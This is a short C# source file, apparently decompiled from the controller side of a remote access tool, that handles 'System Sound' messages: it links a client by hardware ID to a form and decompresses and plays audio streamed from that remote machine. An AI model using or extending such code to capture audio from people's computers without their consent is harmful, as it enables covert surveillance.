using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerSystemSound
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (text == "Sound")
			{
				if (client.Tag == null)
				{
					client.Disconnect();
				}
				else
				{
					((FormSystemSound)client.Tag).Buffer(Decompress((byte[])objects[2]));
				}
			}
			return;
		}
		FormSystemSound form = (FormSystemSound)Application.OpenForms["SystemSound:" + (string)objects[2]];
		if (form == null)
		{
			client.Disconnect();
			return;
		}
		form.Invoke((MethodInvoker)delegate
		{
			form.Text = "System Sound [" + (string)objects[2] + "]";
			form.client = client;
			form.trackBar1.Enabled = true;
			form.materialSwitch1.Enabled = true;
		});
		client.Tag = form;
		client.Hwid = (string)objects[2];
	}

	private static byte[] Decompress(byte[] inputBytes)
	{
		using MemoryStream stream = new MemoryStream(inputBytes);
		using MemoryStream memoryStream = new MemoryStream();
		using (DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress))
		{
			deflateStream.CopyTo(memoryStream);
		}
		return memoryStream.ToArray();
	}
}
